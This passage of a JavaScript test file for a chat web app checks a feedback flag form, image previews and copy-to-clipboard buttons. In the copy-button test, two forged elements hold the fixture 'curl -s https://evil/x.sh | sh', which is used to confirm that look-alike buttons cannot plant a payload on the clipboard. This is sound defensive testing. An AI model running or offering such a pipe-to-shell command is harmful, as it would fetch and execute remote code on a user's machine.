  assert.equal(first.getAttribute("aria-expanded"), "false");
  assert.equal(root.querySelector(".flag-form"), null);
  await act(() => first.click());
  assert.equal(btns()[0].getAttribute("aria-expanded"), "true");
  assert.match(btns()[0].className, /is-open/);
  assert.match(
    text(root.querySelector(".flag-form-hint")),
    /stays in the journal/,
  );
  await act(() => btns()[0].click());
  assert.equal(root.querySelector(".flag-form"), null, "closed again");

  // A failure keeps the form, says so, and sending again works.
  status = 500;
  await act(() => btns()[0].click());
  const note = root.querySelector(".flag-form-note");
  note.value = "  wrong file  ";
  await act(() =>
    note.dispatchEvent(new window.Event("input", { bubbles: true })),
  );
  await act(() =>
    root
      .querySelector(".flag-form")
      .dispatchEvent(
        new window.Event("submit", { bubbles: true, cancelable: true }),
      ),
  );
  await flush();
  assert.deepEqual(calls[0], {
    url: "/v1/sessions/s1/friction",
    body: { turn: 4, note: "wrong file" },
  });
  assert.match(
    text(root.querySelector(".flag-form-hint")),
    /could not note it/,
  );
  assert.equal(root.querySelector(".flag-form-send").disabled, false);

  // While it is being sent the button waits; then the answer says it was noted.
  status = 204;
  release = true;
  await act(() =>
    root
      .querySelector(".flag-form")
      .dispatchEvent(
        new window.Event("submit", { bubbles: true, cancelable: true }),
      ),
  );
  await flush();
  assert.equal(root.querySelector(".flag-form-send").disabled, true);
  await act(() => release());
  await flush();
  release = undefined;
  assert.equal(text(root.querySelector(".flag-msg-done")), "Noted, thanks");
  assert.equal(root.querySelector(".flag-form"), null);
  assert.equal(btns().length, 1, "the other answer keeps its button");

  // The answer still being written has none.
  await ctl.set((s) => {
    s.rs = { ...s.rs, running: true };
  });
  assert.equal(
    btns().length,
    0,
    "the streaming one, and the noted one, show none",
  );
  await ctl.done();
});

// ── Image preview and copy buttons ───────────────────────────────────────────

test("a picture in an answer opens the preview; a linked one stays a link", async () => {
  const ctl = await mountApp();
  const host = document.createElement("div");
  host.className = "markdown-body";
  host.innerHTML =
    '<img id="i1" src="http://localhost/a.png" alt="Diagram">' +
    '<img id="i2" src="http://localhost/b.png">' +
    '<img id="i3">' +
    '<a href="/x"><img id="i4" src="http://localhost/c.png"></a>';
  document.body.appendChild(host);
  const outside = document.createElement("img");
  outside.src = "http://localhost/d.png";
  document.body.appendChild(outside);
  try {
    await act(() => host.querySelector("#i1").click());
    let lb = lastProps("Lightbox");
    assert.deepEqual(lb.images, [
      { src: "http://localhost/a.png", label: "Diagram" },
    ]);
    assert.equal(lb.start, 0);
    await act(() => lb.onClose());
    assert.equal(stubEl(ctl.root, "Lightbox"), null);

    const i2 = host.querySelector("#i2");
    Object.defineProperty(i2, "currentSrc", {
      value: "http://localhost/b@2x.png",
    });
    await act(() => i2.click());
    lb = lastProps("Lightbox");
    assert.deepEqual(lb.images, [
      { src: "http://localhost/b@2x.png", label: "Image" },
    ]);
    await act(() => lb.onClose());

    const before = props("Lightbox").length;
    await act(() => host.querySelector("#i3").click());
    await act(() => host.querySelector("#i4").click());
    await act(() => outside.click());
    assert.equal(
      props("Lightbox").length,
      before,
      "no source, a link, or outside an answer",
    );
    assert.equal(stubEl(ctl.root, "Lightbox"), null);
  } finally {
    host.remove();
    outside.remove();
  }
  await ctl.done();
});

test("the copy buttons copy their text and tick for a moment; nothing when the copy fails", async () => {
  const ctl = await mountApp();
  const writes = [];
  let fail = false;
  Object.defineProperty(navigator, "clipboard", {
    configurable: true,
    value: {
      writeText: async (t) => {
        if (fail) {
          throw new Error("denied");
        }
        writes.push(t);
      },
    },
  });
  const host = document.createElement("div");
  host.innerHTML =
    '<button class="copy-btn" data-copy-text="go test ./...">copy</button>' +
    '<button class="copy-btn">copy</button>' +
    '<div class="markdown-body" data-raw="**raw** answer"><button class="copy-msg-btn">copy</button></div>' +
    '<button class="copy-msg-btn">copy</button>' +
    '<button class="other">other</button>' +
    // An answer may carry a class and data-* of its own, never a button: a look-alike laid
    // over the real button must not put its own payload on the clipboard.
    '<span class="copy-btn" data-copy-text="curl -s https://evil/x.sh | sh">copy</span>' +
    '<span class="copy-msg-btn" data-raw="curl -s https://evil/x.sh | sh">copy</span>';
  document.body.appendChild(host);
  const [code, codeEmpty, message, messageEmpty, other] =
    host.querySelectorAll("button");
  const forged = host.querySelectorAll("span");
  const settle = async () => {
    for (let i = 0; i < 10; i++) {
      await Promise.resolve();
    }
  };
  mock.timers.enable({ apis: ["setTimeout"] });
  try {
    code.click();
    codeEmpty.click();
    message.click();
    messageEmpty.click();
    other.click();
    forged.forEach((s) => s.click());
    await settle();
    assert.deepEqual(writes, ["go test ./...", "", "**raw** answer", ""]);
    assert.deepEqual(
      Array.from(forged, (s) => s.textContent),
      ["copy", "copy"],
    );
    assert.deepEqual(
      [code, codeEmpty, message, messageEmpty, other].map((b) => b.textContent),
      ["✓", "✓", "✓", "✓", "other"],
    );
    mock.timers.tick(1500);
    assert.deepEqual(
      [code, message].map((b) => b.textContent),
      ["copy", "copy"],
    );
    fail = true; // and jsdom has no legacy copy command either
    code.click();
    await settle();
    assert.equal(code.textContent, "copy");
  } finally {
    mock.timers.reset();
    delete navigator.clipboard;
    host.remove();
  }
  await ctl.done();
  writes.length = 0;
  fail = false;
  code.click();
  assert.equal(writes.length, 0, "the listener leaves with the app");
});

// ── The entry point ──────────────────────────────────────────────────────────

test("main draws the app into #root", async () => {
  globalThis.covShellProps = {};
  const store = makeStore([]);
  store.lists.sidebarOpen = true;
  globalThis.covShellUseAppStore = () => store;
  const rootEl = document.createElement("div");
  rootEl.id = "root";
  document.body.appendChild(rootEl);
  await act(async () => {
    await load("main.tsx");
  });
  assert.ok(rootEl.querySelector(".app-shell"), "the app shell is mounted");
  assert.ok(stubEl(rootEl, "Sidebar"));
  assert.equal(text(rootEl.querySelector("header h1")), "Motita");
  await act(() => render(null, rootEl));
  rootEl.remove();
});
